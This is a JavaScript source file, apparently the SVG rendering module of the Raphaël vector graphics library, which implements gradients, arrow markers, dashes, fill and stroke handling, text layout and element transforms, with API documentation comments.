__WEBPACK_AMD_DEFINE_RESULT__ = (function(R) {\n    if (R && !R.svg) {\n        return;\n    }\n\n    var has = "hasOwnProperty",\n        Str = String,\n        toFloat = parseFloat,\n        toInt = parseInt,\n        math = Math,\n        mmax = math.max,\n        abs = math.abs,\n        pow = math.pow,\n        separator = /[, ]+/,\n        eve = R.eve,\n        E = "",\n        S = " ";\n    var xlink = "https://www.w3.org/1999/xlink",\n        markers = {\n            block: "M5,0 0,2.5 5,5z",\n            classic: "M5,0 0,2.5 5,5 3.5,3 3.5,2z",\n            diamond: "M2.5,0 5,2.5 2.5,5 0,2.5z",\n            open: "M6,1 1,3.5 6,6",\n            oval: "M2.5,0A2.5,2.5,0,0,1,2.5,5 2.5,2.5,0,0,1,2.5,0z"\n        },\n        markerCounter = {};\n    R.toString = function () {\n        return  "Your browser supports SVG.\\nYou are running Rapha\\xebl " + this.version;\n    };\n    var $ = function (el, attr) {\n        if (attr) {\n            if (typeof el == "string") {\n                el = $(el);\n            }\n            for (var key in attr) if (attr[has](key)) {\n                if (key.substring(0, 6) == "xlink:") {\n                    el.setAttributeNS(xlink, key.substring(6), Str(attr[key]));\n                } else {\n                    el.setAttribute(key, Str(attr[key]));\n                }\n            }\n        } else {\n            el = R._g.doc.createElementNS("https://www.w3.org/2000/svg", el);\n            el.style && (el.style.webkitTapHighlightColor = "rgba(0,0,0,0)");\n        }\n        return el;\n    },\n    addGradientFill = function (element, gradient) {\n        var type = "linear",\n            id = element.id + gradient,\n            fx = .5, fy = .5,\n            o = element.node,\n            SVG = element.paper,\n            s = o.style,\n            el = R._g.doc.getElementById(id);\n        if (!el) {\n            gradient = Str(gradient).replace(R._radial_gradient, function (all, _fx, _fy) {\n                type = "radial";\n                if (_fx && _fy) {\n                    fx = toFloat(_fx);\n                    fy = toFloat(_fy);\n                    var dir = ((fy > .5) * 2 - 1);\n                    pow(fx - .5, 2) + pow(fy - .5, 2) > .25 &&\n                        (fy = math.sqrt(.25 - pow(fx - .5, 2)) * dir + .5) &&\n                        fy != .5 &&\n                        (fy = fy.toFixed(5) - 1e-5 * dir);\n                }\n                return E;\n            });\n            gradient = gradient.split(/\\s*\\-\\s*/);\n            if (type == "linear") {\n                var angle = gradient.shift();\n                angle = -toFloat(angle);\n                if (isNaN(angle)) {\n                    return null;\n                }\n                var vector = [0, 0, math.cos(R.rad(angle)), math.sin(R.rad(angle))],\n                    max = 1 / (mmax(abs(vector[2]), abs(vector[3])) || 1);\n                vector[2] *= max;\n                vector[3] *= max;\n                if (vector[2] < 0) {\n                    vector[0] = -vector[2];\n                    vector[2] = 0;\n                }\n                if (vector[3] < 0) {\n                    vector[1] = -vector[3];\n                    vector[3] = 0;\n                }\n            }\n            var dots = R._parseDots(gradient);\n            if (!dots) {\n                return null;\n            }\n            id = id.replace(/[\\(\\)\\s,\\xb0#]/g, "_");\n\n            if (element.gradient && id != element.gradient.id) {\n                SVG.defs.removeChild(element.gradient);\n                delete element.gradient;\n            }\n\n            if (!element.gradient) {\n                el = $(type + "Gradient", {id: id});\n                element.gradient = el;\n                $(el, type == "radial" ? {\n                    fx: fx,\n                    fy: fy\n                } : {\n                    x1: vector[0],\n                    y1: vector[1],\n                    x2: vector[2],\n                    y2: vector[3],\n                    gradientTransform: element.matrix.invert()\n                });\n                SVG.defs.appendChild(el);\n                for (var i = 0, ii = dots.length; i < ii; i++) {\n                    el.appendChild($("stop", {\n                        offset: dots[i].offset ? dots[i].offset : i ? "100%" : "0%",\n                        "stop-color": dots[i].color || "#fff",\n                        "stop-opacity": isFinite(dots[i].opacity) ? dots[i].opacity : 1\n                    }));\n                }\n            }\n        }\n        $(o, {\n            fill: fillurl(id),\n            opacity: 1,\n            "fill-opacity": 1\n        });\n        s.fill = E;\n        s.opacity = 1;\n        s.fillOpacity = 1;\n        return 1;\n    },\n    isIE9or10 = function () {\n      var mode = document.documentMode;\n      return mode && (mode === 9 || mode === 10);\n    },\n    fillurl = function (id) {\n      if (isIE9or10()) {\n          return "url(\'#" + id + "\')";\n      }\n      var location = document.location;\n      var locationString = (\n          location.protocol + \'//\' +\n          location.host +\n          location.pathname +\n          location.search\n      );\n      return "url(\'" + locationString + "#" + id + "\')";\n    },\n    updatePosition = function (o) {\n        var bbox = o.getBBox(1);\n        $(o.pattern, {patternTransform: o.matrix.invert() + " translate(" + bbox.x + "," + bbox.y + ")"});\n    },\n    addArrow = function (o, value, isEnd) {\n        if (o.type == "path") {\n            var values = Str(value).toLowerCase().split("-"),\n                p = o.paper,\n                se = isEnd ? "end" : "start",\n                node = o.node,\n                attrs = o.attrs,\n                stroke = attrs["stroke-width"],\n                i = values.length,\n                type = "classic",\n                from,\n                to,\n                dx,\n                refX,\n                attr,\n                w = 3,\n                h = 3,\n                t = 5;\n            while (i--) {\n                switch (values[i]) {\n                    case "block":\n                    case "classic":\n                    case "oval":\n                    case "diamond":\n                    case "open":\n                    case "none":\n                        type = values[i];\n                        break;\n                    case "wide": h = 5; break;\n                    case "narrow": h = 2; break;\n                    case "long": w = 5; break;\n                    case "short": w = 2; break;\n                }\n            }\n            if (type == "open") {\n                w += 2;\n                h += 2;\n                t += 2;\n                dx = 1;\n                refX = isEnd ? 4 : 1;\n                attr = {\n                    fill: "none",\n                    stroke: attrs.stroke\n                };\n            } else {\n                refX = dx = w / 2;\n                attr = {\n                    fill: attrs.stroke,\n                    stroke: "none"\n                };\n            }\n            if (o._.arrows) {\n                if (isEnd) {\n                    o._.arrows.endPath && markerCounter[o._.arrows.endPath]--;\n                    o._.arrows.endMarker && markerCounter[o._.arrows.endMarker]--;\n                } else {\n                    o._.arrows.startPath && markerCounter[o._.arrows.startPath]--;\n                    o._.arrows.startMarker && markerCounter[o._.arrows.startMarker]--;\n                }\n            } else {\n                o._.arrows = {};\n            }\n            if (type != "none") {\n                var pathId = "raphael-marker-" + type,\n                    markerId = "raphael-marker-" + se + type + w + h + "-obj" + o.id;\n                if (!R._g.doc.getElementById(pathId)) {\n                    p.defs.appendChild($($("path"), {\n                        "stroke-linecap": "round",\n                        d: markers[type],\n                        id: pathId\n                    }));\n                    markerCounter[pathId] = 1;\n                } else {\n                    markerCounter[pathId]++;\n                }\n                var marker = R._g.doc.getElementById(markerId),\n                    use;\n                if (!marker) {\n                    marker = $($("marker"), {\n                        id: markerId,\n                        markerHeight: h,\n                        markerWidth: w,\n                        orient: "auto",\n                        refX: refX,\n                        refY: h / 2\n                    });\n                    use = $($("use"), {\n                        "xlink:href": "#" + pathId,\n                        transform: (isEnd ? "rotate(180 " + w / 2 + " " + h / 2 + ") " : E) + "scale(" + w / t + "," + h / t + ")",\n                        "stroke-width": (1 / ((w / t + h / t) / 2)).toFixed(4)\n                    });\n                    marker.appendChild(use);\n                    p.defs.appendChild(marker);\n                    markerCounter[markerId] = 1;\n                } else {\n                    markerCounter[markerId]++;\n                    use = marker.getElementsByTagName("use")[0];\n                }\n                $(use, attr);\n                var delta = dx * (type != "diamond" && type != "oval");\n                if (isEnd) {\n                    from = o._.arrows.startdx * stroke || 0;\n                    to = R.getTotalLength(attrs.path) - delta * stroke;\n                } else {\n                    from = delta * stroke;\n                    to = R.getTotalLength(attrs.path) - (o._.arrows.enddx * stroke || 0);\n                }\n                attr = {};\n                attr["marker-" + se] = "url(#" + markerId + ")";\n                if (to || from) {\n                    attr.d = R.getSubpath(attrs.path, from, to);\n                }\n                $(node, attr);\n                o._.arrows[se + "Path"] = pathId;\n                o._.arrows[se + "Marker"] = markerId;\n                o._.arrows[se + "dx"] = delta;\n                o._.arrows[se + "Type"] = type;\n                o._.arrows[se + "String"] = value;\n            } else {\n                if (isEnd) {\n                    from = o._.arrows.startdx * stroke || 0;\n                    to = R.getTotalLength(attrs.path) - from;\n                } else {\n                    from = 0;\n                    to = R.getTotalLength(attrs.path) - (o._.arrows.enddx * stroke || 0);\n                }\n                o._.arrows[se + "Path"] && $(node, {d: R.getSubpath(attrs.path, from, to)});\n                delete o._.arrows[se + "Path"];\n                delete o._.arrows[se + "Marker"];\n                delete o._.arrows[se + "dx"];\n                delete o._.arrows[se + "Type"];\n                delete o._.arrows[se + "String"];\n            }\n            for (attr in markerCounter) if (markerCounter[has](attr) && !markerCounter[attr]) {\n                var item = R._g.doc.getElementById(attr);\n                item && item.parentNode.removeChild(item);\n            }\n        }\n    },\n    dasharray = {\n        "-": [3, 1],\n        ".": [1, 1],\n        "-.": [3, 1, 1, 1],\n        "-..": [3, 1, 1, 1, 1, 1],\n        ". ": [1, 3],\n        "- ": [4, 3],\n        "--": [8, 3],\n        "- .": [4, 3, 1, 3],\n        "--.": [8, 3, 1, 3],\n        "--..": [8, 3, 1, 3, 1, 3]\n    },\n    addDashes = function (o, value, params) {\n        value = dasharray[Str(value).toLowerCase()];\n        if (value) {\n            var width = o.attrs["stroke-width"] || "1",\n                butt = {round: width, square: width, butt: 0}[o.attrs["stroke-linecap"] || params["stroke-linecap"]] || 0,\n                dashes = [],\n                i = value.length;\n            while (i--) {\n                dashes[i] = value[i] * width + ((i % 2) ? 1 : -1) * butt;\n            }\n            $(o.node, {"stroke-dasharray": dashes.join(",")});\n        }\n        else {\n          $(o.node, {"stroke-dasharray": "none"});\n        }\n    },\n    setFillAndStroke = function (o, params) {\n        var node = o.node,\n            attrs = o.attrs,\n            vis = node.style.visibility;\n        node.style.visibility = "hidden";\n        for (var att in params) {\n            if (params[has](att)) {\n                if (!R._availableAttrs[has](att)) {\n                    continue;\n                }\n                var value = params[att];\n                attrs[att] = value;\n                switch (att) {\n                    case "blur":\n                        o.blur(value);\n                        break;\n                    case "title":\n                        var title = node.getElementsByTagName("title");\n\n                        // Use the existing <title>.\n                        if (title.length && (title = title[0])) {\n                          title.firstChild.nodeValue = value;\n                        } else {\n                          title = $("title");\n                          var val = R._g.doc.createTextNode(value);\n                          title.appendChild(val);\n                          node.appendChild(title);\n                        }\n                        break;\n                    case "href":\n                    case "target":\n                        var pn = node.parentNode;\n                        if (pn.tagName.toLowerCase() != "a") {\n                            var hl = $("a");\n                            pn.insertBefore(hl, node);\n                            hl.appendChild(node);\n                            pn = hl;\n                        }\n                        if (att == "target") {\n                            pn.setAttributeNS(xlink, "show", value == "blank" ? "new" : value);\n                        } else {\n                            pn.setAttributeNS(xlink, att, value);\n                        }\n                        break;\n                    case "cursor":\n                        node.style.cursor = value;\n                        break;\n                    case "transform":\n                        o.transform(value);\n                        break;\n                    case "arrow-start":\n                        addArrow(o, value);\n                        break;\n                    case "arrow-end":\n                        addArrow(o, value, 1);\n                        break;\n                    case "clip-rect":\n                        var rect = Str(value).split(separator);\n                        if (rect.length == 4) {\n                            o.clip && o.clip.parentNode.parentNode.removeChild(o.clip.parentNode);\n                            var el = $("clipPath"),\n                                rc = $("rect");\n                            el.id = R.createUUID();\n                            $(rc, {\n                                x: rect[0],\n                                y: rect[1],\n                                width: rect[2],\n                                height: rect[3]\n                            });\n                            el.appendChild(rc);\n                            o.paper.defs.appendChild(el);\n                            $(node, {"clip-path": "url(#" + el.id + ")"});\n                            o.clip = rc;\n                        }\n                        if (!value) {\n                            var path = node.getAttribute("clip-path");\n                            if (path) {\n                                var clip = R._g.doc.getElementById(path.replace(/(^url\\(#|\\)$)/g, E));\n                                clip && clip.parentNode.removeChild(clip);\n                                $(node, {"clip-path": E});\n                                delete o.clip;\n                            }\n                        }\n                    break;\n                    case "path":\n                        if (o.type == "path") {\n                            $(node, {d: value ? attrs.path = R._pathToAbsolute(value) : "M0,0"});\n                            o._.dirty = 1;\n                            if (o._.arrows) {\n                                "startString" in o._.arrows && addArrow(o, o._.arrows.startString);\n                                "endString" in o._.arrows && addArrow(o, o._.arrows.endString, 1);\n                            }\n                        }\n                        break;\n                    case "width":\n                        node.setAttribute(att, value);\n                        o._.dirty = 1;\n                        if (attrs.fx) {\n                            att = "x";\n                            value = attrs.x;\n                        } else {\n                            break;\n                        }\n                    case "x":\n                        if (attrs.fx) {\n                            value = -attrs.x - (attrs.width || 0);\n                        }\n                    case "rx":\n                        if (att == "rx" && o.type == "rect") {\n                            break;\n                        }\n                    case "cx":\n                        node.setAttribute(att, value);\n                        o.pattern && updatePosition(o);\n                        o._.dirty = 1;\n                        break;\n                    case "height":\n                        node.setAttribute(att, value);\n                        o._.dirty = 1;\n                        if (attrs.fy) {\n                            att = "y";\n                            value = attrs.y;\n                        } else {\n                            break;\n                        }\n                    case "y":\n                        if (attrs.fy) {\n                            value = -attrs.y - (attrs.height || 0);\n                        }\n                    case "ry":\n                        if (att == "ry" && o.type == "rect") {\n                            break;\n                        }\n                    case "cy":\n                        node.setAttribute(att, value);\n                        o.pattern && updatePosition(o);\n                        o._.dirty = 1;\n                        break;\n                    case "r":\n                        if (o.type == "rect") {\n                            $(node, {rx: value, ry: value});\n                        } else {\n                            node.setAttribute(att, value);\n                        }\n                        o._.dirty = 1;\n                        break;\n                    case "src":\n                        if (o.type == "image") {\n                            node.setAttributeNS(xlink, "href", value);\n                        }\n                        break;\n                    case "stroke-width":\n                        if (o._.sx != 1 || o._.sy != 1) {\n                            value /= mmax(abs(o._.sx), abs(o._.sy)) || 1;\n                        }\n                        node.setAttribute(att, value);\n                        if (attrs["stroke-dasharray"]) {\n                            addDashes(o, attrs["stroke-dasharray"], params);\n                        }\n                        if (o._.arrows) {\n                            "startString" in o._.arrows && addArrow(o, o._.arrows.startString);\n                            "endString" in o._.arrows && addArrow(o, o._.arrows.endString, 1);\n                        }\n                        break;\n                    case "stroke-dasharray":\n                        addDashes(o, value, params);\n                        break;\n                    case "fill":\n                        var isURL = Str(value).match(R._ISURL);\n                        if (isURL) {\n                            el = $("pattern");\n                            var ig = $("image");\n                            el.id = R.createUUID();\n                            $(el, {x: 0, y: 0, patternUnits: "userSpaceOnUse", height: 1, width: 1});\n                            $(ig, {x: 0, y: 0, "xlink:href": isURL[1]});\n                            el.appendChild(ig);\n\n                            (function (el) {\n                                R._preload(isURL[1], function () {\n                                    var w = this.offsetWidth,\n                                        h = this.offsetHeight;\n                                    $(el, {width: w, height: h});\n                                    $(ig, {width: w, height: h});\n                                });\n                            })(el);\n                            o.paper.defs.appendChild(el);\n                            $(node, {fill: "url(#" + el.id + ")"});\n                            o.pattern = el;\n                            o.pattern && updatePosition(o);\n                            break;\n                        }\n                        var clr = R.getRGB(value);\n                        if (!clr.error) {\n                            delete params.gradient;\n                            delete attrs.gradient;\n                            !R.is(attrs.opacity, "undefined") &&\n                                R.is(params.opacity, "undefined") &&\n                                $(node, {opacity: attrs.opacity});\n                            !R.is(attrs["fill-opacity"], "undefined") &&\n                                R.is(params["fill-opacity"], "undefined") &&\n                                $(node, {"fill-opacity": attrs["fill-opacity"]});\n                        } else if ((o.type == "circle" || o.type == "ellipse" || Str(value).charAt() != "r") && addGradientFill(o, value)) {\n                            if ("opacity" in attrs || "fill-opacity" in attrs) {\n                                var gradient = R._g.doc.getElementById(node.getAttribute("fill").replace(/^url\\(#|\\)$/g, E));\n                                if (gradient) {\n                                    var stops = gradient.getElementsByTagName("stop");\n                                    $(stops[stops.length - 1], {"stop-opacity": ("opacity" in attrs ? attrs.opacity : 1) * ("fill-opacity" in attrs ? attrs["fill-opacity"] : 1)});\n                                }\n                            }\n                            attrs.gradient = value;\n                            attrs.fill = "none";\n                            break;\n                        }\n                        clr[has]("opacity") && $(node, {"fill-opacity": clr.opacity > 1 ? clr.opacity / 100 : clr.opacity});\n                    case "stroke":\n                        clr = R.getRGB(value);\n                        node.setAttribute(att, clr.hex);\n                        att == "stroke" && clr[has]("opacity") && $(node, {"stroke-opacity": clr.opacity > 1 ? clr.opacity / 100 : clr.opacity});\n                        if (att == "stroke" && o._.arrows) {\n                            "startString" in o._.arrows && addArrow(o, o._.arrows.startString);\n                            "endString" in o._.arrows && addArrow(o, o._.arrows.endString, 1);\n                        }\n                        break;\n                    case "gradient":\n                        (o.type == "circle" || o.type == "ellipse" || Str(value).charAt() != "r") && addGradientFill(o, value);\n                        break;\n                    case "opacity":\n                        if (attrs.gradient && !attrs[has]("stroke-opacity")) {\n                            $(node, {"stroke-opacity": value > 1 ? value / 100 : value});\n                        }\n                        // fall\n                    case "fill-opacity":\n                        if (attrs.gradient) {\n                            gradient = R._g.doc.getElementById(node.getAttribute("fill").replace(/^url\\(#|\\)$/g, E));\n                            if (gradient) {\n                                stops = gradient.getElementsByTagName("stop");\n                                $(stops[stops.length - 1], {"stop-opacity": value});\n                            }\n                            break;\n                        }\n                    default:\n                        att == "font-size" && (value = toInt(value, 10) + "px");\n                        var cssrule = att.replace(/(\\-.)/g, function (w) {\n                            return w.substring(1).toUpperCase();\n                        });\n                        node.style[cssrule] = value;\n                        o._.dirty = 1;\n                        node.setAttribute(att, value);\n                        break;\n                }\n            }\n        }\n\n        tuneText(o, params);\n        node.style.visibility = vis;\n    },\n    leading = 1.2,\n    tuneText = function (el, params) {\n        if (el.type != "text" || !(params[has]("text") || params[has]("font") || params[has]("font-size") || params[has]("x") || params[has]("y"))) {\n            return;\n        }\n        var a = el.attrs,\n            node = el.node,\n            fontSize = node.firstChild ? toInt(R._g.doc.defaultView.getComputedStyle(node.firstChild, E).getPropertyValue("font-size"), 10) : 10;\n\n        if (params[has]("text")) {\n            a.text = params.text;\n            while (node.firstChild) {\n                node.removeChild(node.firstChild);\n            }\n            var texts = Str(params.text).split("\\n"),\n                tspans = [],\n                tspan;\n            for (var i = 0, ii = texts.length; i < ii; i++) {\n                tspan = $("tspan");\n                i && $(tspan, {dy: fontSize * leading, x: a.x});\n                tspan.appendChild(R._g.doc.createTextNode(texts[i]));\n                node.appendChild(tspan);\n                tspans[i] = tspan;\n            }\n        } else {\n            tspans = node.getElementsByTagName("tspan");\n            for (i = 0, ii = tspans.length; i < ii; i++) if (i) {\n                $(tspans[i], {dy: fontSize * leading, x: a.x});\n            } else {\n                $(tspans[0], {dy: 0});\n            }\n        }\n        $(node, {x: a.x, y: a.y});\n        el._.dirty = 1;\n        var bb = el._getBBox(),\n            dif = a.y - (bb.y + bb.height / 2);\n        dif && R.is(dif, "finite") && $(tspans[0], {dy: dif});\n    },\n    getRealNode = function (node) {\n        if (node.parentNode && node.parentNode.tagName.toLowerCase() === "a") {\n            return node.parentNode;\n        } else {\n            return node;\n        }\n    },\n    Element = function (node, svg) {\n        var X = 0,\n            Y = 0;\n        /*\\\n         * Element.node\n         [ property (object) ]\n         **\n         * Gives you a reference to the DOM object, so you can assign event handlers or just mess around.\n         **\n         * Note: Donât mess with it.\n         > Usage\n         | // draw a circle at coordinate 10,10 with radius of 10\n         | var c = paper.circle(10, 10, 10);\n         | c.node.onclick = function () {\n         |     c.attr("fill", "red");\n         | };\n        \\*/\n        this[0] = this.node = node;\n        /*\\\n         * Element.raphael\n         [ property (object) ]\n         **\n         * Internal reference to @Raphael object. In case it is not available.\n         > Usage\n         | Raphael.el.red = function () {\n         |     var hsb = this.paper.raphael.rgb2hsb(this.attr("fill"));\n         |     hsb.h = 1;\n         |     this.attr({fill: this.paper.raphael.hsb2rgb(hsb).hex});\n         | }\n        \\*/\n        node.raphael = true;\n        /*\\\n         * Element.id\n         [ property (number) ]\n         **\n         * Unique id of the element. Especially useful when you want to listen to events of the element,\n         * because all events are fired in format `<module>.<action>.<id>`. Also useful for @Paper.getById method.\n        \\*/\n        this.id = guid();\n        node.raphaelid = this.id;\n\n        /**\n        * Method that returns a 5 letter/digit id, enough for 36^5 = 60466176 elements\n        * @returns {string} id\n        */\n        function guid() {\n            return ("0000" + (Math.random()*Math.pow(36,5) << 0).toString(36)).slice(-5);\n        }\n\n        this.matrix = R.matrix();\n        this.realPath = null;\n        /*\\\n         * Element.paper\n         [ property (object) ]\n         **\n         * Internal reference to âpaperâ where object drawn. Mainly for use in plugins and element extensions.\n         > Usage\n         | Raphael.el.cross = function () {\n         |     this.attr({fill: "red"});\n         |     this.paper.path("M10,10L50,50M50,10L10,50")\n         |         .attr({stroke: "red"});\n         | }\n        \\*/\n        this.paper = svg;\n        this.attrs = this.attrs || {};\n        this._ = {\n            transform: [],\n            sx: 1,\n            sy: 1,\n            deg: 0,\n            dx: 0,\n            dy: 0,\n            dirty: 1\n        };\n        !svg.bottom && (svg.bottom = this);\n        /*\\\n         * Element.prev\n         [ property (object) ]\n         **\n         * Reference to the previous element in the hierarchy.\n        \\*/\n        this.prev = svg.top;\n        svg.top && (svg.top.next = this);\n        svg.top = this;\n        /*\\\n         * Element.next\n         [ property (object) ]\n         **\n         * Reference to the next element in the hierarchy.\n        \\*/\n        this.next = null;\n    },\n    elproto = R.el;\n\n    Element.prototype = elproto;\n    elproto.constructor = Element;\n\n    R._engine.path = function (pathString, SVG) {\n        var el = $("path");\n        SVG.canvas && SVG.canvas.appendChild(el);\n        var p = new Element(el, SVG);\n        p.type = "path";\n        setFillAndStroke(p, {\n            fill: "none",\n            stroke: "#000",\n            path: pathString\n        });\n        return p;\n    };\n    /*\\\n     * Element.rotate\n     [ method ]\n     **\n     * Deprecated! Use @Element.transform instead.\n     * Adds rotation by given angle around given point to the list of\n     * transformations of the element.\n     > Parameters\n     - deg (number) angle in degrees\n     - cx (number) #optional x coordinate of the centre of rotation\n     - cy (number) #optional y coordinate of the centre of rotation\n     * If cx & cy arenât specified centre of the shape is used as a point of rotation.\n     = (object) @Element\n    \\*/\n    elproto.rotate = function (deg, cx, cy) {\n        if (this.removed) {\n            return this;\n        }\n        deg = Str(deg).split(separator);\n        if (deg.length - 1) {\n            cx = toFloat(deg[1]);\n            cy = toFloat(deg[2]);\n        }\n        deg = toFloat(deg[0]);\n        (cy == null) && (cx = cy);\n        if (cx == null || cy == null) {\n            var bbox = this.getBBox(1);\n            cx = bbox.x + bbox.width / 2;\n            cy = bbox.y + bbox.height / 2;\n        }\n        this.transform(this._.transform.concat([["r", deg, cx, cy]]));\n        return this;\n    };\n    /*\\\n     * Element.scale\n     [ method ]\n     **\n     * Deprecated! Use @Element.transform instead.\n     * Adds scale by given amount relative to given point to the list of\n     * transformations of the element.\n     > Parameters\n     - sx (number) horisontal scale amount\n     - sy (number) vertical scale amount\n     - cx (number) #optional x coordinate of the centre of scale\n     - cy (number) #optional y coordinate of the centre of scale\n     * If cx & cy arenât specified centre of the shape is used instead.\n     = (object) @Element\n    \\*/\n    elproto.scale = function (sx, sy, cx, cy) {\n        if (this.removed) {\n            return this;\n        }\n        sx = Str(sx).split(separator);\n        if (sx.length - 1) {\n            sy = toFloat(sx[1]);\n            cx = toFloat(sx[2]);\n            cy = toFloat(sx[3]);\n        }\n        sx = toFloat(sx[0]);\n        (sy == null) && (sy = sx);\n        (cy == null) && (cx = cy);\n        if (cx == null || cy == null) {\n            var bbox = this.getBBox(1);\n        }\n        cx = cx == null ? bbox.x + bbox.width / 2 : cx;\n        cy = cy == null ? bbox.y + bbox.height / 2 : cy;\n        this.transform(this._.transform.concat([["s", sx, sy, cx, cy]]));\n        return this;\n    };\n    /*\\\n     * Element.translate\n     [ method ]\n     **\n     * Deprecated! Use @Element.transform instead.\n     * Adds translation by given amount to the list of transformations of the element.\n     > Parameters\n     - dx (number) horisontal shift\n     - dy (number) vertical shift\n     = (object) @Element\n    \\*/\n    elproto.translate = function (dx, dy) {\n        if (this.removed) {\n            return this;\n        }\n        dx = Str(dx).split(separator);\n        if (dx.length - 1) {\n            dy = toFloat(dx[1]);\n        }\n        dx = toFloat(dx[0]) || 0;\n        dy = +dy || 0;\n        this.transform(this._.transform.concat([["t", dx, dy]]));\n        return this;\n    };\n    /*\\\n     * Element.transform\n     [ method ]\n     **\n     * Adds transformation to the element which is separate to other attributes,\n     * i.e. translation doesnât change `x` or `y` of the rectange. The format\n     * of transformation string is similar to the path string syntax:\n     | "t100,100r30,100,100s2,2,100,100r45s1.5"\n     * Each letter is a command. There are four commands: `t` is for translate, `r` is for rotate, `s` is for\n     * scale and `m` is for matrix.\n     *\n     * There are also alternative âabsoluteâ translation, rotation and scale: `T`, `R` and `S`. They will not take previous transformation into account. For example, `...T100,0` will always move element 100 px horisontally, while `...t100,0` could move it vertically if there is `r90` before. Just compare results of `r90t100,0` and `r90T100,0`.\n     *\n     * So, the example line above could be read like âtranslate by 100, 100; rotate 30Â° around 100, 100; scale twice around 100, 100;\n     * rotate 45Â° around centre; scale 1.5 times relative to centreâ. As you can see rotate and scale commands have origin\n     * coordinates as optional parameters, the default is the centre point of the element.\n     * Matrix accepts six parameters.\n     > Usage\n     | var el = paper.rect(10, 20, 300, 200);\n     | // translate 100, 100, rotate 45Â°, translate -100, 0\n     | el.transform("t100,100r45t-100,0");\n     | // if you want you can append or prepend transformations\n     | el.transform("...t50,50");\n     | el.transform("s2...");\n     | // or even wrap\n     | el.transform("t50,50...t-50-50");\n     | // to reset transformation call method with empty string\n     | el.transform("");\n     | // to get current value call it without parameters\n     | console.log(el.transform());\n     > Parameters\n     - tstr (string) #optional transformation string\n     * If tstr isnât specified\n     = (string) current transformation string\n     * else\n     = (object) @Element\n    \\*/\n    elproto.transform = function (tstr) {\n        var _ = this._;\n        if (tstr == null) {\n            return _.transform;\n        }\n        R._extractTransform(this, tstr);\n\n        this.clip && $(this.clip, {transform: this.matrix.invert()});\n        this.pattern && updatePosition(this);\n        this.node && $(this.node, {transform: this.matrix});\n\n        if (_.sx != 1 || _.sy != 1) {\n            var sw = this.attrs[has]("stroke-width") ? this.attrs["stroke-width"] : 1;\n            this.attr({"stroke-width": sw});\n        }\n\n        return this;\n    };\n    /*\\\n     * Element.hide\n     [ method ]\n     **\n     * Makes element invisible. See @Element.show.\n     = (object) @Element\n    \\*/\n    elproto.hide = function () {\n        if(!this.removed) this.node.style.display = "none";\n        return this;\n    };\n    /*\\\n     * Element.show\n     [ method ]\n     **\n     * Makes element visible. See @Element.hide.\n     = (object) @Element\n    \\*/\n    elproto.show = function () {\n        if(!this.removed) this.node.style.display = "";\n        return this;\n    };\n    /*\\\n     * Element.remove\n     [ method ]\n     **\n     * Removes element from the paper.\n    \\*/\n    elproto.remove = function () {\n        var node = getRealNode(this.node);\n        if (this.removed || !node.parentNode) {\n            return;\n        }\n        var paper = this.paper;\n        paper.__set__ && paper.__set__.exclude(this);\n        eve.unbind("raphael.*.*." + this.id);\n        if (this.gradient) {\n            paper.defs.removeChild(this.gradient);\n        }\n        R._tear(this, paper);\n\n        node.parentNode.removeChild(node);\n\n        // Remove custom data for element\n        this.removeData();\n\n        for (var i in this) {\n            this[i] = typeof this[i] == "function" ? R._removedFactory(i) : null;\n        }\n        this.removed = true;\n    };\n    elproto._getBBox = function () {\n        if (this.node.style.display == "none") {\n            this.show();\n            var hide = true;\n        }\n        var canvasHidden = false,\n            containerStyle;\n        if (this.paper.canvas.parentElement) {\n          containerStyle = this.paper.canvas.parentElement.style;\n        } //IE10+ can\'t find parentElement\n        else if (this.paper.canvas.parentNode) {\n          containerStyle = this.paper.canvas.parentNode.style;\n        }\n\n        if(containerStyle && containerStyle.display == "none") {\n          canvasHidden = true;\n          containerStyle.display = "";\n        }\n        var bbox = {};\n        try {\n            bbox = this.node.getBBox();\n        } catch(e) {\n            // Firefox 3.0.x, 25.0.1 (probably more versions affected) play badly here - possible fix\n            bbox = {\n                x: this.node.clientLeft,\n                y: this.node.clientTop,\n                width: this.node.clientWidth,\n                height: this.node.clientHeight\n            }\n        } finally {\n            bbox = bbox || {};\n            if(canvasHidden){\n              containerStyle.display = "none";\n            }\n        }\n        hide && this.hide();\n        return bbox;\n    };\n    /*\\\n     * Element.attr\n     [ method ]\n     **\n     * Sets the attributes of the element.\n     > Parameters\n     - attrName (string) attributeâs name\n     - value (string) value\n     * or\n     - params (object) object of name/value pairs\n     * or\n     - attrName (string) attributeâs name\n     * or\n     - attrNames (array) in this case method returns array of current values for given attribute names\n     = (object) @Element if attrsName & value or params are passed in.\n     = (...) value of the attribute if only attrsName is passed in.\n     = (array) array of values of the attribute if attrsNames is passed in.\n     = (object) object of attributes if nothing is passed in.\n     > Possible parameters\n     # <p>Please refer to the <a href="https://www.w3.org/TR/SVG/" title="The W3C Recommendation for the SVG language describes these properties in detail.">SVG specification</a> for an explanation of these parameters.</p>\n     o arrow-end (string) arrowhead on the end of the path. The format for string is `<type>[-<width>[-<length>]]`. Possible types: `classic`, `block`, `open`, `oval`, `diamond`, `none`, width: `wide`, `narrow`, `medium`, length: `long`, `short`, `midium`.\n     o clip-rect (string) comma or space separated values: x, y, width and height\n     o cursor (string) CSS type of the cursor\n     o cx (number) the x-axis coordinate of the center of the circle, or ellipse\n     o cy (number) the y-axis coordinate of the center of the circle, or ellipse\n     o fill (string) colour, gradient or image\n     o fill-opacity (number)\n     o font (string)\n     o font-family (string)\n     o font-size (number) font size in pixels\n     o font-weight (string)\n     o height (number)\n     o href (string) URL, if specified element behaves as hyperlink\n     o opacity (number)\n     o path (string) SVG path string format\n     o r (number) radius of the circle, ellipse or rounded corner on the rect\n     o rx (number) horisontal radius of the ellipse\n     o ry (number) vertical radius of the ellipse\n     o src (string) image URL, only works for @Element.image element\n     o stroke (string) stroke colour\n     o stroke-dasharray (string) [ââ, ânoneâ, â`-`â, â`.`â, â`-.`â, â`-..`â, â`. `â, â`- `â, â`--`â, â`- .`â, â`--.`â, â`--..`â]\n     o stroke-linecap (string) [â`butt`â, â`square`â, â`round`â]\n     o stroke-linejoin (string) [â`bevel`â, â`round`â, â`miter`â]\n     o stroke-miterlimit (number)\n     o stroke-opacity (number)\n     o stroke-width (number) stroke width in pixels, default is \'1\'\n     o target (string) used with href\n     o text (string) contents of the text element. Use `\\n` for multiline text\n     o text-anchor (string) [â`start`â, â`middle`â, â`end`â], default is â`middle`â\n     o title (string) will create tooltip with a given text\n     o transform (string) see @Element.transform\n     o width (number)\n     o x (number)\n     o y (number)\n     > Gradients\n     * Linear gradient format: 